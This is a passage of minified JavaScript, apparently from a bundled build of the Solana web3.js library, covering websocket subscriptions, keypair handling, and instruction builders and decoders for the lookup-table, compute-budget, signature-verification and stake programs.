                                console.error(n)
                            }
                        }))
                    }
                    _wsOnAccountNotification(e) {
                        const {
                            result: t,
                            subscription: n
                        } = Ve(e, Wi);
                        this._handleServerNotification(n, [t.value, t.context])
                    }
                    _makeSubscription(e, t) {
                        const n = this._nextClientSubscriptionId++,
                            r = Kr([e.method, t], !0),
                            i = this._subscriptionsByHash[r];
                        return void 0 === i ? this._subscriptionsByHash[r] = { ...e,
                            args: t,
                            callbacks: new Set([e.callback]),
                            state: "pending"
                        } : i.callbacks.add(e.callback), this._subscriptionDisposeFunctionsByClientSubscriptionId[n] = async () => {
                            delete this._subscriptionDisposeFunctionsByClientSubscriptionId[n];
                            const t = this._subscriptionsByHash[r];
                            ir(void 0 !== t, `Could not find a \`Subscription\` when tearing down client subscription #${n}`), t.callbacks.delete(e.callback), await this._updateSubscriptions()
                        }, this._updateSubscriptions(), n
                    }
                    onAccountChange(e, t, n) {
                        const r = this._buildArgs([e.toBase58()], n || this._commitment || "finalized", "base64");
                        return this._makeSubscription({
                            callback: t,
                            method: "accountSubscribe",
                            unsubscribeMethod: "accountUnsubscribe"
                        }, r)
                    }
                    async removeAccountChangeListener(e) {
                        await this._unsubscribeClientSubscription(e, "account change")
                    }
                    _wsOnProgramAccountNotification(e) {
                        const {
                            result: t,
                            subscription: n
                        } = Ve(e, qi);
                        this._handleServerNotification(n, [{
                            accountId: t.value.pubkey,
                            accountInfo: t.value.account
                        }, t.context])
                    }
                    onProgramAccountChange(e, t, n, r) {
                        const i = this._buildArgs([e.toBase58()], n || this._commitment || "finalized", "base64", r ? {
                            filters: r
                        } : void 0);
                        return this._makeSubscription({
                            callback: t,
                            method: "programSubscribe",
                            unsubscribeMethod: "programUnsubscribe"
                        }, i)
                    }
                    async removeProgramAccountChangeListener(e) {
                        await this._unsubscribeClientSubscription(e, "program account change")
                    }
                    onLogs(e, t, n) {
                        const r = this._buildArgs(["object" === typeof e ? {
                            mentions: [e.toString()]
                        } : e], n || this._commitment || "finalized");
                        return this._makeSubscription({
                            callback: t,
                            method: "logsSubscribe",
                            unsubscribeMethod: "logsUnsubscribe"
                        }, r)
                    }
                    async removeOnLogsListener(e) {
                        await this._unsubscribeClientSubscription(e, "logs")
                    }
                    _wsOnLogsNotification(e) {
                        const {
                            result: t,
                            subscription: n
                        } = Ve(e, To);
                        this._handleServerNotification(n, [t.value, t.context])
                    }
                    _wsOnSlotNotification(e) {
                        const {
                            result: t,
                            subscription: n
                        } = Ve(e, Qi);
                        this._handleServerNotification(n, [t])
                    }
                    onSlotChange(e) {
                        return this._makeSubscription({
                            callback: e,
                            method: "slotSubscribe",
                            unsubscribeMethod: "slotUnsubscribe"
                        }, [])
                    }
                    async removeSlotChangeListener(e) {
                        await this._unsubscribeClientSubscription(e, "slot change")
                    }
                    _wsOnSlotUpdatesNotification(e) {
                        const {
                            result: t,
                            subscription: n
                        } = Ve(e, Yi);
                        this._handleServerNotification(n, [t])
                    }
                    onSlotUpdate(e) {
                        return this._makeSubscription({
                            callback: e,
                            method: "slotsUpdatesSubscribe",
                            unsubscribeMethod: "slotsUpdatesUnsubscribe"
                        }, [])
                    }
                    async removeSlotUpdateListener(e) {
                        await this._unsubscribeClientSubscription(e, "slot update")
                    }
                    async _unsubscribeClientSubscription(e, t) {
                        const n = this._subscriptionDisposeFunctionsByClientSubscriptionId[e];
                        n ? await n() : console.warn(`Ignored unsubscribe request because an active subscription with id \`${e}\` for '${t}' events could not be found.`)
                    }
                    _buildArgs(e, t, n, r) {
                        const i = t || this._commitment;
                        if (i || n || r) {
                            let t = {};
                            n && (t.encoding = n), i && (t.commitment = i), r && (t = Object.assign(t, r)), e.push(t)
                        }
                        return e
                    }
                    _buildArgsAtLeastConfirmed(e, t, n, r) {
                        const i = t || this._commitment;
                        if (i && !["confirmed", "finalized"].includes(i)) throw new Error("Using Connection with default commitment: `" + this._commitment + "`, but method requires at least `confirmed`");
                        return this._buildArgs(e, t, n, r)
                    }
                    _wsOnSignatureNotification(e) {
                        const {
                            result: t,
                            subscription: n
                        } = Ve(e, Zi);
                        "receivedSignature" !== t.value && this._subscriptionsAutoDisposedByRpc.add(n), this._handleServerNotification(n, "receivedSignature" === t.value ? [{
                            type: "received"
                        }, t.context] : [{
                            type: "status",
                            result: t.value
                        }, t.context])
                    }
                    onSignature(e, t, n) {
                        const r = this._buildArgs([e], n || this._commitment || "finalized"),
                            i = this._makeSubscription({
                                callback: (e, n) => {
                                    if ("status" === e.type) {
                                        t(e.result, n);
                                        try {
                                            this.removeSignatureListener(i)
                                        } catch (r) {}
                                    }
                                },
                                method: "signatureSubscribe",
                                unsubscribeMethod: "signatureUnsubscribe"
                            }, r);
                        return i
                    }
                    onSignatureWithOptions(e, t, n) {
                        const {
                            commitment: r,
                            ...i
                        } = { ...n,
                            commitment: n && n.commitment || this._commitment || "finalized"
                        }, o = this._buildArgs([e], r, void 0, i), s = this._makeSubscription({
                            callback: (e, n) => {
                                t(e, n);
                                try {
                                    this.removeSignatureListener(s)
                                } catch (r) {}
                            },
                            method: "signatureSubscribe",
                            unsubscribeMethod: "signatureUnsubscribe"
                        }, o);
                        return s
                    }
                    async removeSignatureListener(e) {
                        await this._unsubscribeClientSubscription(e, "signature result")
                    }
                    _wsOnRootNotification(e) {
                        const {
                            result: t,
                            subscription: n
                        } = Ve(e, Ji);
                        this._handleServerNotification(n, [t])
                    }
                    onRootChange(e) {
                        return this._makeSubscription({
                            callback: e,
                            method: "rootSubscribe",
                            unsubscribeMethod: "rootUnsubscribe"
                        }, [])
                    }
                    async removeRootChangeListener(e) {
                        await this._unsubscribeClientSubscription(e, "root change")
                    }
                }
                class Po {
                    constructor(e) {
                        this._keypair = void 0, this._keypair = null !== e && void 0 !== e ? e : On()
                    }
                    static generate() {
                        return new Po(On())
                    }
                    static fromSecretKey(e, t) {
                        if (64 !== e.byteLength) throw new Error("bad secret key size");
                        const n = e.slice(32, 64);
                        if (!t || !t.skipValidation) {
                            const t = e.slice(0, 32),
                                r = Cn(t);
                            for (let e = 0; e < 32; e++)
                                if (n[e] !== r[e]) throw new Error("provided secretKey is invalid")
                        }
                        return new Po({
                            publicKey: n,
                            secretKey: e
                        })
                    }
                    static fromSeed(e) {
                        const t = Cn(e),
                            n = new Uint8Array(64);
                        return n.set(e), n.set(t, 32), new Po({
                            publicKey: t,
                            secretKey: n
                        })
                    }
                    get publicKey() {
                        return new Wn(this._keypair.publicKey)
                    }
                    get secretKey() {
                        return new Uint8Array(this._keypair.secretKey)
                    }
                }
                const Lo = Object.freeze({
                    CreateLookupTable: {
                        index: 0,
                        layout: Ne.n_([Ne.Jq("instruction"), Cr("recentSlot"), Ne.u8("bumpSeed")])
                    },
                    FreezeLookupTable: {
                        index: 1,
                        layout: Ne.n_([Ne.Jq("instruction")])
                    },
                    ExtendLookupTable: {
                        index: 2,
                        layout: Ne.n_([Ne.Jq("instruction"), Cr(), Ne.A9(Xn(), Ne.cv(Ne.Jq(), -8), "addresses")])
                    },
                    DeactivateLookupTable: {
                        index: 3,
                        layout: Ne.n_([Ne.Jq("instruction")])
                    },
                    CloseLookupTable: {
                        index: 4,
                        layout: Ne.n_([Ne.Jq("instruction")])
                    }
                });
                class No {
                    constructor() {}
                    static decodeInstructionType(e) {
                        this.checkProgramId(e.programId);
                        const t = Ne.Jq("instruction").decode(e.data);
                        let n;
                        for (const [r, i] of Object.entries(Lo))
                            if (i.index == t) {
                                n = r;
                                break
                            }
                        if (!n) throw new Error("Invalid Instruction. Should be a LookupTable Instruction");
                        return n
                    }
                    static decodeCreateLookupTable(e) {
                        this.checkProgramId(e.programId), this.checkKeysLength(e.keys, 4);
                        const {
                            recentSlot: t
                        } = xr(Lo.CreateLookupTable, e.data);
                        return {
                            authority: e.keys[1].pubkey,
                            payer: e.keys[2].pubkey,
                            recentSlot: Number(t)
                        }
                    }
                    static decodeExtendLookupTable(e) {
                        if (this.checkProgramId(e.programId), e.keys.length < 2) throw new Error(`invalid instruction; found ${e.keys.length} keys, expected at least 2`);
                        const {
                            addresses: t
                        } = xr(Lo.ExtendLookupTable, e.data);
                        return {
                            lookupTable: e.keys[0].pubkey,
                            authority: e.keys[1].pubkey,
                            payer: e.keys.length > 2 ? e.keys[2].pubkey : void 0,
                            addresses: t.map((e => new Wn(e)))
                        }
                    }
                    static decodeCloseLookupTable(e) {
                        return this.checkProgramId(e.programId), this.checkKeysLength(e.keys, 3), {
                            lookupTable: e.keys[0].pubkey,
                            authority: e.keys[1].pubkey,
                            recipient: e.keys[2].pubkey
                        }
                    }
                    static decodeFreezeLookupTable(e) {
                        return this.checkProgramId(e.programId), this.checkKeysLength(e.keys, 2), {
                            lookupTable: e.keys[0].pubkey,
                            authority: e.keys[1].pubkey
                        }
                    }
                    static decodeDeactivateLookupTable(e) {
                        return this.checkProgramId(e.programId), this.checkKeysLength(e.keys, 2), {
                            lookupTable: e.keys[0].pubkey,
                            authority: e.keys[1].pubkey
                        }
                    }
                    static checkProgramId(e) {
                        if (!e.equals(Ro.programId)) throw new Error("invalid instruction; programId is not AddressLookupTable Program")
                    }
                    static checkKeysLength(e, t) {
                        if (e.length < t) throw new Error(`invalid instruction; found ${e.length} keys, expected at least ${t}`)
                    }
                }
                class Ro {
                    constructor() {}
                    static createLookupTable(e) {
                        const [t, n] = Wn.findProgramAddressSync([e.authority.toBuffer(), (0, Re.k$)(BigInt(e.recentSlot), 8)], this.programId), r = Ir(Lo.CreateLookupTable, {
                            recentSlot: BigInt(e.recentSlot),
                            bumpSeed: n
                        }), i = [{
                            pubkey: t,
                            isSigner: !1,
                            isWritable: !0
                        }, {
                            pubkey: e.authority,
                            isSigner: !0,
                            isWritable: !1
                        }, {
                            pubkey: e.payer,
                            isSigner: !0,
                            isWritable: !0
                        }, {
                            pubkey: Rr.programId,
                            isSigner: !1,
                            isWritable: !1
                        }];
                        return [new fr({
                            programId: this.programId,
                            keys: i,
                            data: r
                        }), t]
                    }
                    static freezeLookupTable(e) {
                        const t = Ir(Lo.FreezeLookupTable),
                            n = [{
                                pubkey: e.lookupTable,
                                isSigner: !1,
                                isWritable: !0
                            }, {
                                pubkey: e.authority,
                                isSigner: !0,
                                isWritable: !1
                            }];
                        return new fr({
                            programId: this.programId,
                            keys: n,
                            data: t
                        })
                    }
                    static extendLookupTable(e) {
                        const t = Ir(Lo.ExtendLookupTable, {
                                addresses: e.addresses.map((e => e.toBytes()))
                            }),
                            n = [{
                                pubkey: e.lookupTable,
                                isSigner: !1,
                                isWritable: !0
                            }, {
                                pubkey: e.authority,
                                isSigner: !0,
                                isWritable: !1
                            }];
                        return e.payer && n.push({
                            pubkey: e.payer,
                            isSigner: !0,
                            isWritable: !0
                        }, {
                            pubkey: Rr.programId,
                            isSigner: !1,
                            isWritable: !1
                        }), new fr({
                            programId: this.programId,
                            keys: n,
                            data: t
                        })
                    }
                    static deactivateLookupTable(e) {
                        const t = Ir(Lo.DeactivateLookupTable),
                            n = [{
                                pubkey: e.lookupTable,
                                isSigner: !1,
                                isWritable: !0
                            }, {
                                pubkey: e.authority,
                                isSigner: !0,
                                isWritable: !1
                            }];
                        return new fr({
                            programId: this.programId,
                            keys: n,
                            data: t
                        })
                    }
                    static closeLookupTable(e) {
                        const t = Ir(Lo.CloseLookupTable),
                            n = [{
                                pubkey: e.lookupTable,
                                isSigner: !1,
                                isWritable: !0
                            }, {
                                pubkey: e.authority,
                                isSigner: !0,
                                isWritable: !1
                            }, {
                                pubkey: e.recipient,
                                isSigner: !1,
                                isWritable: !0
                            }];
                        return new fr({
                            programId: this.programId,
                            keys: n,
                            data: t
                        })
                    }
                }
                Ro.programId = new Wn("AddressLookupTab1e1111111111111111111111111");
                class Do {
                    constructor() {}
                    static decodeInstructionType(e) {
                        this.checkProgramId(e.programId);
                        const t = Ne.u8("instruction").decode(e.data);
                        let n;
                        for (const [r, i] of Object.entries(zo))
                            if (i.index == t) {
                                n = r;
                                break
                            }
                        if (!n) throw new Error("Instruction type incorrect; not a ComputeBudgetInstruction");
                        return n
                    }
                    static decodeRequestUnits(e) {
                        this.checkProgramId(e.programId);
                        const {
                            units: t,
                            additionalFee: n
                        } = xr(zo.RequestUnits, e.data);
                        return {
                            units: t,
                            additionalFee: n
                        }
                    }
                    static decodeRequestHeapFrame(e) {
                        this.checkProgramId(e.programId);
                        const {
                            bytes: t
                        } = xr(zo.RequestHeapFrame, e.data);
                        return {
                            bytes: t
                        }
                    }
                    static decodeSetComputeUnitLimit(e) {
                        this.checkProgramId(e.programId);
                        const {
                            units: t
                        } = xr(zo.SetComputeUnitLimit, e.data);
                        return {
                            units: t
                        }
                    }
                    static decodeSetComputeUnitPrice(e) {
                        this.checkProgramId(e.programId);
                        const {
                            microLamports: t
                        } = xr(zo.SetComputeUnitPrice, e.data);
                        return {
                            microLamports: t
                        }
                    }
                    static checkProgramId(e) {
                        if (!e.equals(Uo.programId)) throw new Error("invalid instruction; programId is not ComputeBudgetProgram")
                    }
                }
                const zo = Object.freeze({
                    RequestUnits: {
                        index: 0,
                        layout: Ne.n_([Ne.u8("instruction"), Ne.Jq("units"), Ne.Jq("additionalFee")])
                    },
                    RequestHeapFrame: {
                        index: 1,
                        layout: Ne.n_([Ne.u8("instruction"), Ne.Jq("bytes")])
                    },
                    SetComputeUnitLimit: {
                        index: 2,
                        layout: Ne.n_([Ne.u8("instruction"), Ne.Jq("units")])
                    },
                    SetComputeUnitPrice: {
                        index: 3,
                        layout: Ne.n_([Ne.u8("instruction"), Cr("microLamports")])
                    }
                });
                class Uo {
                    constructor() {}
                    static requestUnits(e) {
                        const t = Ir(zo.RequestUnits, e);
                        return new fr({
                            keys: [],
                            programId: this.programId,
                            data: t
                        })
                    }
                    static requestHeapFrame(e) {
                        const t = Ir(zo.RequestHeapFrame, e);
                        return new fr({
                            keys: [],
                            programId: this.programId,
                            data: t
                        })
                    }
                    static setComputeUnitLimit(e) {
                        const t = Ir(zo.SetComputeUnitLimit, e);
                        return new fr({
                            keys: [],
                            programId: this.programId,
                            data: t
                        })
                    }
                    static setComputeUnitPrice(e) {
                        const t = Ir(zo.SetComputeUnitPrice, {
                            microLamports: BigInt(e.microLamports)
                        });
                        return new fr({
                            keys: [],
                            programId: this.programId,
                            data: t
                        })
                    }
                }
                Uo.programId = new Wn("ComputeBudget111111111111111111111111111111");
                const jo = Ne.n_([Ne.u8("numSignatures"), Ne.u8("padding"), Ne.KB("signatureOffset"), Ne.KB("signatureInstructionIndex"), Ne.KB("publicKeyOffset"), Ne.KB("publicKeyInstructionIndex"), Ne.KB("messageDataOffset"), Ne.KB("messageDataSize"), Ne.KB("messageInstructionIndex")]);
                class Fo {
                    constructor() {}
                    static createInstructionWithPublicKey(e) {
                        const {
                            publicKey: t,
                            message: n,
                            signature: i,
                            instructionIndex: o
                        } = e;
                        ir(32 === t.length, `Public Key must be 32 bytes but received ${t.length} bytes`), ir(64 === i.length, `Signature must be 64 bytes but received ${i.length} bytes`);
                        const s = jo.span,
                            a = s + t.length,
                            u = a + i.length,
                            c = r.lW.alloc(u + n.length),
                            l = null == o ? 65535 : o;
                        return jo.encode({
                            numSignatures: 1,
                            padding: 0,
                            signatureOffset: a,
                            signatureInstructionIndex: l,
                            publicKeyOffset: s,
                            publicKeyInstructionIndex: l,
                            messageDataOffset: u,
                            messageDataSize: n.length,
                            messageInstructionIndex: l
                        }, c), c.fill(t, s), c.fill(i, a), c.fill(n, u), new fr({
                            keys: [],
                            programId: Fo.programId,
                            data: c
                        })
                    }
                    static createInstructionWithPrivateKey(e) {
                        const {
                            privateKey: t,
                            message: n,
                            instructionIndex: r
                        } = e;
                        ir(64 === t.length, `Private key must be 64 bytes but received ${t.length} bytes`);
                        try {
                            const e = Po.fromSecretKey(t),
                                i = e.publicKey.toBytes(),
                                o = Ln(n, e.secretKey);
                            return this.createInstructionWithPublicKey({
                                publicKey: i,
                                message: n,
                                signature: o,
                                instructionIndex: r
                            })
                        } catch (i) {
                            throw new Error(`Error creating instruction; ${i}`)
                        }
                    }
                }
                Fo.programId = new Wn("Ed25519SigVerify111111111111111111111111111"), Bn.hmacSha256Sync = function(e) {
                    const t = Ct.create(Pe, e);
                    for (var n = arguments.length, r = new Array(n > 1 ? n - 1 : 0), i = 1; i < n; i++) r[i - 1] = arguments[i];
                    return r.forEach((e => t.update(e))), t.digest()
                };
                const Ho = (e, t) => function(e, t) {
                    let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                    const {
                        seed: r,
                        m: i,
                        d: o
                    } = Sn(e, t, n.extraEntropy);
                    let s;
                    const a = new gn;
                    for (a.reseedSync(r); !(s = bn(a.generateSync(), i, o));) a.reseedSync();
                    return In(s, n)
                }(e, t, {
                    der: !1,
                    recovered: !0
                });
                Bn.isValidPrivateKey;
                const Wo = function(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
                        return Vt.fromPrivateKey(e).toRawBytes(t)
                    },
                    Ko = Ne.n_([Ne.u8("numSignatures"), Ne.KB("signatureOffset"), Ne.u8("signatureInstructionIndex"), Ne.KB("ethAddressOffset"), Ne.u8("ethAddressInstructionIndex"), Ne.KB("messageDataOffset"), Ne.KB("messageDataSize"), Ne.u8("messageInstructionIndex"), Ne.Ik(20, "ethAddress"), Ne.Ik(64, "signature"), Ne.u8("recoveryId")]);
                class qo {
                    constructor() {}
                    static publicKeyToEthAddress(e) {
                        ir(64 === e.length, `Public key must be 64 bytes but received ${e.length} bytes`);
                        try {
                            return r.lW.from(Bt(Rn(e))).slice(-20)
                        } catch (t) {
                            throw new Error(`Error constructing Ethereum address: ${t}`)
                        }
                    }
                    static createInstructionWithPublicKey(e) {
                        const {
                            publicKey: t,
                            message: n,
                            signature: r,
                            recoveryId: i,
                            instructionIndex: o
                        } = e;
                        return qo.createInstructionWithEthAddress({
                            ethAddress: qo.publicKeyToEthAddress(t),
                            message: n,
                            signature: r,
                            recoveryId: i,
                            instructionIndex: o
                        })
                    }
                    static createInstructionWithEthAddress(e) {
                        const {
                            ethAddress: t,
                            message: n,
                            signature: i,
                            recoveryId: o,
                            instructionIndex: s = 0
                        } = e;
                        let a;
                        a = "string" === typeof t ? t.startsWith("0x") ? r.lW.from(t.substr(2), "hex") : r.lW.from(t, "hex") : t, ir(20 === a.length, `Address must be 20 bytes but received ${a.length} bytes`);
                        const u = 12 + a.length,
                            c = u + i.length + 1,
                            l = r.lW.alloc(Ko.span + n.length);
                        return Ko.encode({
                            numSignatures: 1,
                            signatureOffset: u,
                            signatureInstructionIndex: s,
                            ethAddressOffset: 12,
                            ethAddressInstructionIndex: s,
                            messageDataOffset: c,
                            messageDataSize: n.length,
                            messageInstructionIndex: s,
                            signature: Rn(i),
                            ethAddress: Rn(a),
                            recoveryId: o
                        }, l), l.fill(Rn(n), Ko.span), new fr({
                            keys: [],
                            programId: qo.programId,
                            data: l
                        })
                    }
                    static createInstructionWithPrivateKey(e) {
                        const {
                            privateKey: t,
                            message: n,
                            instructionIndex: i
                        } = e;
                        ir(32 === t.length, `Private key must be 32 bytes but received ${t.length} bytes`);
                        try {
                            const e = Rn(t),
                                o = Wo(e, !1).slice(1),
                                s = r.lW.from(Bt(Rn(n))),
                                [a, u] = Ho(s, e);
                            return this.createInstructionWithPublicKey({
                                publicKey: o,
                                message: n,
                                signature: a,
                                recoveryId: u,
                                instructionIndex: i
                            })
                        } catch (o) {
                            throw new Error(`Error creating instruction; ${o}`)
                        }
                    }
                }
                qo.programId = new Wn("KeccakSecp256k11111111111111111111111111111");
                const Vo = new Wn("StakeConfig11111111111111111111111111111111");
                class Qo {
                    constructor(e, t) {
                        this.staker = void 0, this.withdrawer = void 0, this.staker = e, this.withdrawer = t
                    }
                }
                class Go {
                    constructor(e, t, n) {
                        this.unixTimestamp = void 0, this.epoch = void 0, this.custodian = void 0, this.unixTimestamp = e, this.epoch = t, this.custodian = n
                    }
                }
                Go.default = new Go(0, 0, Wn.default);
                class Yo {
                    constructor() {}
                    static decodeInstructionType(e) {
                        this.checkProgramId(e.programId);
                        const t = Ne.Jq("instruction").decode(e.data);
                        let n;
                        for (const [r, i] of Object.entries(Zo))
                            if (i.index == t) {
                                n = r;
                                break
                            }
                        if (!n) throw new Error("Instruction type incorrect; not a StakeInstruction");
                        return n
                    }
                    static decodeInitialize(e) {
                        this.checkProgramId(e.programId), this.checkKeyLength(e.keys, 2);
                        const {
                            authorized: t,
                            lockup: n
                        } = xr(Zo.Initialize, e.data);
                        return {
                            stakePubkey: e.keys[0].pubkey,
                            authorized: new Qo(new Wn(t.staker), new Wn(t.withdrawer)),
                            lockup: new Go(n.unixTimestamp, n.epoch, new Wn(n.custodian))
                        }
                    }
                    static decodeDelegate(e) {
                        return this.checkProgramId(e.programId), this.checkKeyLength(e.keys, 6), xr(Zo.Delegate, e.data), {
                            stakePubkey: e.keys[0].pubkey,
                            votePubkey: e.keys[1].pubkey,
                            authorizedPubkey: e.keys[5].pubkey
                        }
                    }
                    static decodeAuthorize(e) {
                        this.checkProgramId(e.programId), this.checkKeyLength(e.keys, 3);
                        const {
                            newAuthorized: t,
                            stakeAuthorizationType: n
                        } = xr(Zo.Authorize, e.data), r = {
                            stakePubkey: e.keys[0].pubkey,
                            authorizedPubkey: e.keys[2].pubkey,
                            newAuthorizedPubkey: new Wn(t),
                            stakeAuthorizationType: {
                                index: n
                            }
                        };
                        return e.keys.length > 3 && (r.custodianPubkey = e.keys[3].pubkey), r
                    }
                    static decodeAuthorizeWithSeed(e) {
                        this.checkProgramId(e.programId), this.checkKeyLength(e.keys, 2);
                        const {
                            newAuthorized: t,
                            stakeAuthorizationType: n,
                            authoritySeed: r,
                            authorityOwner: i
                        } = xr(Zo.AuthorizeWithSeed, e.data), o = {
                            stakePubkey: e.keys[0].pubkey,
                            authorityBase: e.keys[1].pubkey,
                            authoritySeed: r,
                            authorityOwner: new Wn(i),
                            newAuthorizedPubkey: new Wn(t),
                            stakeAuthorizationType: {
                                index: n
                            }
                        };
                        return e.keys.length > 3 && (o.custodianPubkey = e.keys[3].pubkey), o
                    }
                    static decodeSplit(e) {
                        this.checkProgramId(e.programId), this.checkKeyLength(e.keys, 3);
                        const {
                            lamports: t
                        } = xr(Zo.Split, e.data);
                        return {
                            stakePubkey: e.keys[0].pubkey,
                            splitStakePubkey: e.keys[1].pubkey,
                            authorizedPubkey: e.keys[2].pubkey,
                            lamports: t
                        }
                    }
                    static decodeMerge(e) {
                        return this.checkProgramId(e.programId), this.checkKeyLength(e.keys, 3), xr(Zo.Merge, e.data), {
                            stakePubkey: e.keys[0].pubkey,
                            sourceStakePubKey: e.keys[1].pubkey,
                            authorizedPubkey: e.keys[4].pubkey
                        }
                    }
                    static decodeWithdraw(e) {
                        this.checkProgramId(e.programId), this.checkKeyLength(e.keys, 5);
                        const {
                            lamports: t
                        } = xr(Zo.Withdraw, e.data), n = {
                            stakePubkey: e.keys[0].pubkey,
                            toPubkey: e.keys[1].pubkey,
                            authorizedPubkey: e.keys[4].pubkey,
                            lamports: t
                        };
                        return e.keys.length > 5 && (n.custodianPubkey = e.keys[5].pubkey), n
                    }
                    static decodeDeactivate(e) {
                        return this.checkProgramId(e.programId), this.checkKeyLength(e.keys, 3), xr(Zo.Deactivate, e.data), {
                            stakePubkey: e.keys[0].pubkey,
                            authorizedPubkey: e.keys[2].pubkey
                        }
                    }
                    static checkProgramId(e) {
                        if (!e.equals(Xo.programId)) throw new Error("invalid instruction; programId is not StakeProgram")
                    }
                    static checkKeyLength(e, t) {
                        if (e.length < t) throw new Error(`invalid instruction; found ${e.length} keys, expected at least ${t}`)
                    }
                }
                const Zo = Object.freeze({
                        Initialize: {
                            index: 0,
                            layout: Ne.n_([Ne.Jq("instruction"), function() {
                                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "authorized";
                                return Ne.n_([Xn("staker"), Xn("withdrawer")], e)
                            }(), function() {
                                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "lockup";
                                return Ne.n_([Ne.gM("unixTimestamp"), Ne.gM("epoch"), Xn("custodian")], e)
                            }()])
                        },
                        Authorize: {
                            index: 1,
                            layout: Ne.n_([Ne.Jq("instruction"), Xn("newAuthorized"), Ne.Jq("stakeAuthorizationType")])
                        },
                        Delegate: {
                            index: 2,
                            layout: Ne.n_([Ne.Jq("instruction")])
                        },
                        Split: {
                            index: 3,
                            layout: Ne.n_([Ne.Jq("instruction"), Ne.gM("lamports")])
                        },
                        Withdraw: {
                            index: 4,
                            layout: Ne.n_([Ne.Jq("instruction"), Ne.gM("lamports")])
                        },
                        Deactivate: {
                            index: 5,
                            layout: Ne.n_([Ne.Jq("instruction")])
                        },
                        Merge: {
                            index: 7,
                            layout: Ne.n_([Ne.Jq("instruction")])
                        },
                        AuthorizeWithSeed: {
                            index: 8,
                            layout: Ne.n_([Ne.Jq("instruction"), Xn("newAuthorized"), Ne.Jq("stakeAuthorizationType"), er("authoritySeed"), Xn("authorityOwner")])
                        }
                    }),
                    Jo = Object.freeze({
                        Staker: {
                            index: 0
                        },
                        Withdrawer: {
                            index: 1
                        }
                    });
                class Xo {
                    constructor() {}
                    static initialize(e) {
                        const {
                            stakePubkey: t,
                            authorized: n,
                            lockup: r
                        } = e, i = r || Go.default, o = Ir(Zo.Initialize, {
                            authorized: {
                                staker: Rn(n.staker.toBuffer()),
                                withdrawer: Rn(n.withdrawer.toBuffer())
                            },
                            lockup: {
                                unixTimestamp: i.unixTimestamp,
                                epoch: i.epoch,
                                custodian: Rn(i.custodian.toBuffer())
                            }
                        }), s = {
                            keys: [{
                                pubkey: t,
                                isSigner: !1,
                                isWritable: !0
                            }, {
                                pubkey: br,
                                isSigner: !1,
                                isWritable: !1
                            }],
                            programId: this.programId,
                            data: o
                        };
                        return new fr(s)
                    }
                    static createAccountWithSeed(e) {
                        const t = new hr;
                        t.add(Rr.createAccountWithSeed({
                            fromPubkey: e.fromPubkey,
                            newAccountPubkey: e.stakePubkey,
                            basePubkey: e.basePubkey,
                            seed: e.seed,
                            lamports: e.lamports,
                            space: this.space,
                            programId: this.programId
                        }));
                        const {
                            stakePubkey: n,
                            authorized: r,
                            lockup: i
                        } = e;
                        return t.add(this.initialize({
                            stakePubkey: n,
                            authorized: r,
                            lockup: i
                        }))
                    }
                    static createAccount(e) {
                        const t = new hr;
                        t.add(Rr.createAccount({
                            fromPubkey: e.fromPubkey,
                            newAccountPubkey: e.stakePubkey,
                            lamports: e.lamports,
                            space: this.space,
                            programId: this.programId
                        }));
                        const {
                            stakePubkey: n,
                            authorized: r,
                            lockup: i
                        } = e;
                        return t.add(this.initialize({
                            stakePubkey: n,
                            authorized: r,
                            lockup: i
                        }))
                    }
                    static delegate(e) {
                        const {
                            stakePubkey: t,
                            authorizedPubkey: n,
                            votePubkey: r
                        } = e, i = Ir(Zo.Delegate);
                        return (new hr).add({
                            keys: [{
                                pubkey: t,
                                isSigner: !1,
                                isWritable: !0
                            }, {
                                pubkey: r,
                                isSigner: !1,
                                isWritable: !1
                            }, {
                                pubkey: yr,
                                isSigner: !1,
                                isWritable: !1
                            }, {
                                pubkey: _r,
                                isSigner: !1,
                                isWritable: !1
                            }, {
                                pubkey: Vo,
                                isSigner: !1,
                                isWritable: !1
                            }, {
                                pubkey: n,
                                isSigner: !0,
                                isWritable: !1
                            }],
                            programId: this.programId,
                            data: i
                        })
                    }
                    static authorize(e) {
                        const {
                            stakePubkey: t,
                            authorizedPubkey: n,
                            newAuthorizedPubkey: r,
                            stakeAuthorizationType: i,
                            custodianPubkey: o
                        } = e, s = Ir(Zo.Authorize, {
                            newAuthorized: Rn(r.toBuffer()),
                            stakeAuthorizationType: i.index
                        }), a = [{
                            pubkey: t,
                            isSigner: !1,
                            isWritable: !0
                        }, {
                            pubkey: yr,
                            isSigner: !1,
                            isWritable: !0
                        }, {
                            pubkey: n,
                            isSigner: !0,
                            isWritable: !1
                        }];
                        return o && a.push({
                            pubkey: o,
                            isSigner: !1,
                            isWritable: !1
                        }), (new hr).add({
                            keys: a,
                            programId: this.programId,
                            data: s
                        })
                    }
                    static authorizeWithSeed(e) {
                        const {
                            stakePubkey: t,
                            authorityBase: n,
                            authoritySeed: r,
                            authorityOwner: i,
                            newAuthorizedPubkey: o,
                            stakeAuthorizationType: s,
                            custodianPubkey: a
                        } = e, u = Ir(Zo.AuthorizeWithSeed, {
                            newAuthorized: Rn(o.toBuffer()),
                            stakeAuthorizationType: s.index,
                            authoritySeed: r,
                            authorityOwner: Rn(i.toBuffer())
                        }), c = [{
                            pubkey: t,
                            isSigner: !1,
                            isWritable: !0
                        }, {
                            pubkey: n,
                            isSigner: !0,
                            isWritable: !1
                        }, {
                            pubkey: yr,
                            isSigner: !1,
                            isWritable: !1
                        }];
                        return a && c.push({
                            pubkey: a,
                            isSigner: !1,
                            isWritable: !1
                        }), (new hr).add({
                            keys: c,
                            programId: this.programId,
                            data: u
                        })
                    }
                    static splitInstruction(e) {
                        const {
                            stakePubkey: t,
                            authorizedPubkey: n,
                            splitStakePubkey: r,
                            lamports: i
                        } = e, o = Ir(Zo.Split, {
                            lamports: i
                        });
                        return new fr({
                            keys: [{
                                pubkey: t,
                                isSigner: !1,
                                isWritable: !0
                            }, {
                                pubkey: r,
                                isSigner: !1,
                                isWritable: !0
                            }, {
                                pubkey: n,
                                isSigner: !0,
                                isWritable: !1
                            }],
                            programId: this.programId,
                            data: o
                        })
                    }
                    static split(e) {
                        const t = new hr;
                        return t.add(Rr.createAccount({
                            fromPubkey: e.authorizedPubkey,
                            newAccountPubkey: e.splitStakePubkey,
                            lamports: 0,
                            space: this.space,
                            programId: this.programId
                        })), t.add(this.splitInstruction(e))
                    }
                    static splitWithSeed(e) {
                        const {
